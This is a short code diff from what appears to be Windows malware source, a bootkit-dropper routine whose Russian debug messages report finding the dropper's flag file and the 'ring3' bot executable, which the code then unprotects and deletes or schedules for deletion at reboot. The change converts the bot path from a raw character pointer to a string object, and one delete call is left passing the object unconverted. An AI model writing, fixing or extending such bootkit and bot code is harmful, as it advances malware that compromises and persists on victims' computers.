@@ -49,16 +49,16 @@ DWORD WINAPI IsBootkitInstaledThread( LPVOID lpData )
 			BD_MSG("bootkit","файл флага от буткит дропера найден  %s",Path);
 
 			BOT::Unprotect();
-			PCHAR BOT = BOT::GetBotFullExeName();
+			string BOT = BOT::GetBotFullExeName();
 			BD_MSG("bootkit","ищем файл бота ринг3  %s",BOT);
-			if(isFileExist11(BOT))
+			if(isFileExist11(BOT.t_str()))
 			{
 				BD_MSG("bootkit","файл бота ринг3 найден  %s",BOT);
-				pSetFileAttributesA( BOT, FILE_ATTRIBUTE_ARCHIVE );
+				pSetFileAttributesA( BOT.t_str(), FILE_ATTRIBUTE_ARCHIVE );
 				if (!(BOOL)pDeleteFileA(BOT))
 				{
 					BD_MSG("bootkit","no delfile %d",(DWORD)pGetLastError());
-					pMoveFileExA(BOT, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+					pMoveFileExA(BOT.t_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 				}
 				else
 				{
@@ -67,7 +67,6 @@ DWORD WINAPI IsBootkitInstaledThread( LPVOID lpData )
 					pDeleteFileA(Path);
 				}
 			}
-			STR::Free(BOT);
 		}
 		STR::Free(Pref);
 		STR::Free(Path);
